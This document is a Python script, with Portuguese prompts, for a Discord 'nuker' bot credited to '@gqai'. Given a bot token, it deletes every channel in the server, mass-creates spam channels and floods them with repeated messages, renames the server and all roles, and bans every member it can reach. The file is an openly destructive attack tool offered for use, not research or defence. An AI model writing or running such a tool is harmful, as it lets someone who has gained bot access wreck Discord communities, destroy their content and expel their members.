import os
import time
import asyncio
import discord
from discord.ext import commands
from colorama import Fore, Style, init

init(autoreset=True)

def clear_cmd():
    os.system('cls' if os.name == 'nt' else 'clear')

def pause():
    try:
        input(Fore.WHITE + "\nPressione Enter para voltar ao menu...")
    except KeyboardInterrupt:
        pass

def centralizar_texto(texto, largura=80):
    return texto.center(largura)

def mostrar_banner_verde_musgo():
    clear_cmd()
    banner = [
        "• ▌ ▄ ·. ▪   ▐ ▄  ▄▄ •             ",
        "·██ ▐███▪██ •█▌▐█▐█ ▀ ▪▪     ▪     ",
        "▐█ ▌▐▌▐█·▐█·▐█▐▐▌▄█ ▀█▄ ▄█▀▄  ▄█▀▄ ",
        "██ ██▌▐█▌▐█▌██▐█▌▐█▄▪▐█▐█▌.▐▌▐█▌.▐▌",
        "▀▀  █▪▀▀▀ ▀▀▀▀▀ █▪·▀▀▀▀  ▀█▄▀▪ ▀█▄▀▪"
    ]
    largura_terminal = os.get_terminal_size().columns
    cor = Fore.GREEN

    for linha in banner:
        print(cor + centralizar_texto(linha, largura_terminal))
        time.sleep(0.1)

    print(Fore.WHITE + centralizar_texto("Painel Nuker - by @gqai", largura_terminal) + Style.RESET_ALL)

def barra_progresso_rgb(porcentagem):
    barra_len = 40
    preenchido = int(barra_len * porcentagem)
    barra = ''
    for i in range(preenchido):
        barra += Fore.GREEN + '█'  # Verde musgo
    barra += Style.RESET_ALL + Fore.WHITE + '-' * (barra_len - preenchido)
    print(f'\r{Fore.WHITE}[{barra}]{Style.RESET_ALL} {min(int(porcentagem * 100), 100)}%', end='', flush=True)

# Coleta do token
clear_cmd()
mostrar_banner_verde_musgo()
token = input(Fore.WHITE + "Digite o token do bot: " + Style.RESET_ALL).strip()

# Intents e inicialização
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

async def ask_question(question):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, lambda: input(Fore.WHITE + question + Style.RESET_ALL).strip().upper())

async def executar_opcao(guild, opcao):
    if opcao == "1":
        confirmacao = await ask_question("\nTem certeza que deseja excluir TODOS os canais? (S/N): ")
        if confirmacao == 'S':
            channels = guild.channels
            if channels:
                for i, channel in enumerate(channels):
                    try:
                        await channel.delete()
                    except:
                        pass
                    barra_progresso_rgb((i + 1) / len(channels))
                    await asyncio.sleep(0.1)
                print(Fore.GREEN + "\n\nTodos os canais foram apagados com sucesso." + Style.RESET_ALL)
            else:
                print(Fore.WHITE + "\n\nNão há canais para apagar." + Style.RESET_ALL)
            pause()
        else:
            print(Fore.WHITE + "\nAção cancelada." + Style.RESET_ALL)
            pause()
    elif opcao == "2":
        await nukar(guild)
    else:
        print(Fore.WHITE + "Opção inválida." + Style.RESET_ALL)
        pause()

@bot.event
async def on_ready():
    while True:
        clear_cmd()
        mostrar_banner_verde_musgo()
        print(Fore.WHITE + f"\nNuker conectado como: {bot.user}" + Style.RESET_ALL)

        guild = bot.guilds[0]
        print(Fore.WHITE + "\n1 - Apagar todos os canais")
        print("2 - Nukar servidor")
        print("0 - Sair" + Style.RESET_ALL)

        opcao = await ask_question("\nEscolha uma opção: ")

        if opcao == "0":
            print(Fore.WHITE + "Saindo..." + Style.RESET_ALL)
            await bot.close()
            break
        await executar_opcao(guild, opcao)

async def nukar(guild):
    clear_cmd()
    mostrar_banner_verde_musgo()
    print(Fore.WHITE + "Você escolheu a opção Nukar.\n" + Style.RESET_ALL)

    apagar_canais = await ask_question("Deseja apagar todos os canais? (S/N): ")
    criar_novos_canais = await ask_question("Deseja criar novos canais? (S/N): ")

    nome_canal = ""
    quantidade_canais = 0
    if criar_novos_canais == 'S':
        nome_canal = await ask_question("Nome dos novos canais: ")
        quantidade_canais = int(await ask_question("Quantidade de canais: "))

    enviar_msg_canais = 'N'
    repetir_msg_canais = 1
    mensagem = ""
    if criar_novos_canais == 'S':
        enviar_msg_canais = await ask_question("Mandar mensagem nos novos canais? (S/N): ")
        if enviar_msg_canais == 'S':
            mensagem = await ask_question("Mensagem a ser enviada: ")
            repetir_msg_canais = int(await ask_question("Repetições da mensagem: "))

    trocar_nome_servidor = await ask_question("Deseja trocar o nome do servidor? (S/N): ")
    novo_nome_servidor = await ask_question("Novo nome do servidor: ") if trocar_nome_servidor == 'S' else ""

    if len(novo_nome_servidor) < 2 or len(novo_nome_servidor) > 100:
        print(Fore.WHITE + "O nome do servidor deve ter entre 2 e 100 caracteres." + Style.RESET_ALL)
        pause()
        return

    banir_membros = await ask_question("Deseja banir todos os membros? (S/N): ")
    renomear_cargos = await ask_question("Deseja renomear os cargos? (S/N): ")
    nome_cargo = await ask_question("Novo nome dos cargos: ") if renomear_cargos == 'S' else ""

    actions = []
    if apagar_canais == 'S': actions.append("apagar_canais")
    if criar_novos_canais == 'S': actions.append("criar_canais")
    if enviar_msg_canais == 'S': actions.append("enviar_mensagem")
    if trocar_nome_servidor == 'S': actions.append("trocar_nome_servidor")
    if banir_membros == 'S': actions.append("banir_membros")
    if renomear_cargos == 'S': actions.append("renomear_cargos")

    total = len(actions)
    created_channels = []

    if total > 0:
        for idx, action in enumerate(actions):
            if action == "apagar_canais":
                for channel in guild.channels:
                    try:
                        await channel.delete()
                    except:
                        pass
            elif action == "criar_canais":
                for _ in range(quantidade_canais):
                    channel = await guild.create_text_channel(nome_canal)
                    created_channels.append(channel)
            elif action == "enviar_mensagem":
                for channel in created_channels:
                    for _ in range(repetir_msg_canais):
                        try:
                            await channel.send(mensagem)
                        except:
                            pass
            elif action == "trocar_nome_servidor":
                await guild.edit(name=novo_nome_servidor)
            elif action == "banir_membros":
                for member in guild.members:
                    try:
                        if member.id in (guild.owner_id, bot.user.id) or member.top_role >= guild.me.top_role:
                            continue
                        await member.ban(reason="Nukado")
                    except:
                        pass
            elif action == "renomear_cargos":
                for role in guild.roles:
                    if role.name != "@everyone":
                        try:
                            await role.edit(name=nome_cargo)
                        except:
                            pass
            barra_progresso_rgb((idx + 1) / total)
            await asyncio.sleep(0.5)
    else:
        print(Fore.WHITE + "\nNenhuma ação de nuker selecionada." + Style.RESET_ALL)

    print(Fore.GREEN + "\n\nServidor nukado com sucesso!" + Style.RESET_ALL)
    pause()

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Você não tem permissão para isso.")
    elif isinstance(error, commands.CommandNotFound):
        await ctx.send("Comando não encontrado.")
    else:
        await ctx.send(f"Erro: {error}")

bot.run(token)
